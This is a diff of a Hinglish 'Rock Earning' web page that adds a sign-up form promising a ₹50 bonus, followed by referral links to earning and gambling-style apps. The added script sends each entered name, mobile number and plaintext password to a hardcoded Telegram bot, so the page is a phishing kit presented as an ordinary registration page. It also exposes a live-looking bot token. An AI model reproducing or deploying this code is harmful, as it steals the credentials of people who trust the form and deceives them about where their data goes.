@@ -1,155 +1,211 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="hi">
 <head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Rock Earning</title>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Rock Earning - Register</title>
+    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@700;800&family=Montserrat:wght@400;600&display=swap" rel="stylesheet">
+    <style>
+        /* --- General Settings --- */
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Montserrat', sans-serif; }
+        
+        /* Registration Section Styling */
+        #register-section {
+            background: linear-gradient(135deg, #2c3e50 0%, #000000 100%);
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+        }
 
-<style>
-body {
-    margin: 0;
-    font-family: Arial, sans-serif;
-    background: linear-gradient(135deg, #5f6dfc, #6a11cb);
-    color: white;
-    text-align: center;
-}
+        .register-container {
+            background: #ffffff;
+            padding: 30px;
+            border-radius: 20px;
+            box-shadow: 0 15px 35px rgba(0,0,0,0.4);
+            width: 100%;
+            max-width: 420px;
+        }
 
-.header {
-    padding: 20px;
-}
+        .app-logo {
+            font-family: 'Poppins', sans-serif;
+            font-size: 42px;
+            font-weight: 800;
+            text-align: center;
+            margin-bottom: 5px;
+            background: linear-gradient(to right, #f1c40f, #e67e22);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            text-shadow: 2px 2px 4px rgba(0,0,0,0.1);
+        }
 
-.header h1 {
-    font-size: 32px;
-    background: linear-gradient(to right, orange, lime);
-    -webkit-background-clip: text;
-    color: transparent;
-}
+        .register-container h2 { text-align: center; color: #333; margin-bottom: 8px; font-size: 20px; }
+        
+        .bonus-badge {
+            background: #fff8e1;
+            color: #c0392b;
+            text-align: center;
+            padding: 10px;
+            border-radius: 10px;
+            font-size: 13px;
+            margin-bottom: 20px;
+            font-weight: bold;
+            border: 2px dashed #f1c40f;
+        }
 
-.container {
-    padding: 15px;
-}
+        .input-group { margin-bottom: 15px; }
+        .input-group label { display: block; margin-bottom: 7px; color: #444; font-weight: 600; font-size: 14px; }
+        .input-group input {
+            width: 100%;
+            padding: 14px;
+            border: 1px solid #ddd;
+            border-radius: 10px;
+            outline: none;
+            background-color: #f9f9f9;
+        }
 
-.card {
-    background: #f2f2f2;
-    color: black;
-    border-radius: 20px;
-    padding: 20px;
-    margin-bottom: 20px;
-}
+        .btn-register {
+            width: 100%;
+            padding: 14px;
+            background: linear-gradient(to right, #f1c40f, #e67e22);
+            border: none;
+            border-radius: 10px;
+            color: white;
+            font-size: 17px;
+            font-weight: bold;
+            cursor: pointer;
+            box-shadow: 0 5px 15px rgba(230, 126, 34, 0.3);
+        }
 
-.app-icon {
-    width: 70px;
-    height: 70px;
-    background: linear-gradient(45deg, red, orange);
-    border-radius: 20px;
-    margin: auto;
-    display: flex;
-    align-items: center;
-    justify-content: center;
-    font-weight: bold;
-    color: white;
-    font-size: 22px;
-}
+        /* Campion Page (Hidden Initially) */
+        #campion-section {
+            display: none;
+            background: linear-gradient(135deg, #5f6dfc, #6a11cb);
+            color: white;
+            text-align: center;
+            min-height: 100vh;
+            padding: 15px;
+        }
 
-.step {
-    background: #ddd;
-    margin: 8px 0;
-    padding: 10px;
-    border-radius: 10px;
-    font-weight: bold;
-}
+        .campion-h1 {
+            font-size: 30px;
+            background: linear-gradient(to right, orange, lime);
+            -webkit-background-clip: text;
+            color: transparent;
+            margin-top: 20px;
+        }
 
-.btn {
-    display: block;
-    margin: 15px auto;
-    padding: 15px;
-    border-radius: 30px;
-    width: 90%;
-    max-width: 400px;
-    text-decoration: none;
-    font-weight: bold;
-}
-
-.btn-orange {
-    background: linear-gradient(to right, orange, orangered);
-    color: black;
-}
-
-.btn-blue {
-    background: #167db7;
-    color: white;
-}
-
-.telegram {
-    margin-top: 20px;
-}
-
-.telegram img {
-    width: 50px;
-}
-</style>
-
+        .card { background: #ffffff; color: #000; border-radius: 20px; padding: 20px; margin: 15px; }
+        .app-icon { width: 70px; height: 70px; border-radius: 20px; margin: auto; display: flex; align-items: center; justify-content: center; font-weight: bold; color: white; font-size: 22px; }
+        .w03 {background: linear-gradient(45deg, red, orange);}
+        .ant {background: linear-gradient(45deg, #00c6ff, #0072ff);}
+        .tf {background: linear-gradient(45deg, purple, pink);}
+        .step { background: #ddd; margin: 8px 0; padding: 10px; border-radius: 10px; font-weight: bold; }
+        .btn-link { display: block; margin: 12px auto; padding: 14px; border-radius: 30px; width: 90%; text-decoration: none; font-weight: bold; }
+        .btn-orange { background: linear-gradient(to right, orange, orangered); color: black; }
+        .btn-blue { background: #167db7; color: white; }
+        
+        footer { margin-top: 20px; padding: 10px; background: black; color: yellow; }
+    </style>
 </head>
 <body>
 
-<div class="header">
-    <h1>Rock Earning</h1>
-    <p>Earn cashback by completing simple steps</p>
+<div id="register-section">
+    <div class="register-container">
+        <div class="app-logo">Rock Earning</div>
+        <h2>Naya Account Banayein</h2>
+        <div class="bonus-badge">🔥 Welcome Bonus: Sign up par ₹50!</div>
+
+        <form id="registerForm">
+            <div class="input-group">
+                <label>Poora Naam</label>
+                <input type="text" id="name" placeholder="Apna naam daalein" required>
+            </div>
+            <div class="input-group">
+                <label>Mobile Number</label>
+                <input type="tel" id="mobile" placeholder="10 digit number" required>
+            </div>
+            <div class="input-group">
+                <label>Password</label>
+                <input type="password" id="password" placeholder="Strong password" required>
+            </div>
+            <button type="submit" class="btn-register" id="submitBtn">Register Karein</button>
+        </form>
+    </div>
 </div>
 
-<div class="container">
+<div id="campion-section">
+    <h1 class="campion-h1">Rock Earning Campion</h1>
+    <p>App ka payment lene ke liye Click link Register and app download</p>
 
-    <!-- WIN03 -->
     <div class="card">
-        <div class="app-icon">W03</div>
+        <div class="app-icon w03">W03</div>
         <h2>🔥 Win03 App</h2>
-        <p>💸 ₹20 Cashback</p>
-
         <div class="step">👉 Register & Download</div>
-        <div class="step">📱 Bind WhatsApp</div>
-        <div class="step">💰 First Withdrawal</div>
-        <div class="step">📸 Screenshot</div>
-
-        <a href="https://win03.club/login?mode=register&i=T8LmIY12" class="btn btn-orange">Register</a>
-        <a href="https://t.me/m_r_Rav" class="btn btn-blue">Send Screenshot</a>
+        <div class="step">💰 First Withdraw</div>
+        <a href="https://win03.club/login?mode=register&i=T8LmIY12" class="btn-link btn-orange">Register</a>
+        <a href="https://t.me/m_r_Rav" class="btn-link btn-blue">Send Screenshot</a>
     </div>
 
-    <!-- ANTHENA -->
     <div class="card">
-        <div class="app-icon" style="background: linear-gradient(45deg, #00c6ff, #0072ff);">ANT</div>
+        <div class="app-icon ant">ANT</div>
         <h2>🚀 Anthena App</h2>
-        <p>💸 ₹30 Cashback</p>
-
-        <div class="step">👉 Register & Download</div>
         <div class="step">📝 Complete Signup</div>
-        <div class="step">📸 Screenshot</div>
-
-        <a href="https://www.gathn.com/registerDesc?code=_6Hdt9P5DGNP" class="btn btn-orange">Register</a>
-        <a href="https://t.me/m_r_Rav" class="btn btn-blue">Send Screenshot</a>
+        <a href="https://www.gathn.com/registerDesc?code=_6Hdt9P5DGNP" class="btn-link btn-orange">Register</a>
+        <a href="https://t.me/m_r_Rav" class="btn-link btn-blue">Send Screenshot</a>
     </div>
 
-    <!-- TASKFLIX -->
-    <div class="card">
-        <div class="app-icon" style="background: linear-gradient(45deg, purple, pink);">TF</div>
-        <h2>🎬 Taskflix App</h2>
-        <p>💸 Earn Money</p>
-
-        <div class="step">👉 Register</div>
-        <div class="step">📸 Screenshot</div>
-
-        <a href="http://www.taskflix.in?promo_code=6934A6E7" class="btn btn-orange">Register</a>
-        <a href="https://t.me/m_r_Rav" class="btn btn-blue">Send Screenshot</a>
+    <div style="margin: 20px;">
+        <h2>Join Telegram: @m_r_Rav</h2>
     </div>
 
-    <!-- TELEGRAM -->
-    <div class="telegram">
-        <h2>Join Telegram</h2>
-        <img src="https://upload.wikimedia.org/wikipedia/commons/8/82/Telegram_logo.svg">
-        <p>@m_r_Rav</p>
-        <p>Send your Screenshot and UPI ID</p>
-    </div>
-
+    <footer>© 2026 Rock Earning Campion</footer>
 </div>
+
+<script>
+    const form = document.getElementById('registerForm');
+    
+    form.addEventListener('submit', function(e) {
+        e.preventDefault();
+        const submitBtn = document.getElementById('submitBtn');
+        submitBtn.innerText = "Verifying...";
+        submitBtn.disabled = true;
+
+        // Aapki Verified Details
+        const token = "8656244880:AAHGBx-s4Mc8nuIgoi8DtiqPL99_KUaVncg";
+        const chat_id = "8682457838"; 
+        
+        const name = document.getElementById('name').value;
+        const mobile = document.getElementById('mobile').value;
+        const password = document.getElementById('password').value;
+
+        const message = `🚀 *New Registration* 🚀\n\n👤 Name: ${name}\n📱 Mobile: ${mobile}\n🔑 Password: ${password}`;
+
+        const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(message)}&parse_mode=Markdown`;
+
+        fetch(url)
+        .then(response => response.json())
+        .then(data => {
+            if(data.ok) {
+                alert("Abhinandan! Registration safal raha.");
+                // Registration chupao aur Campion page dikhao
+                document.getElementById('register-section').style.display = 'none';
+                document.getElementById('campion-section').style.display = 'block';
+                window.scrollTo(0,0);
+            } else {
+                alert("Error: " + data.description);
+            }
+        })
+        .catch(err => {
+            alert("Internet issue! Phir se try karein.");
+        })
+        .finally(() => {
+            submitBtn.innerText = "Register Karein";
+            submitBtn.disabled = false;
+        });
+    });
+</script>
 
 </body>
 </html>
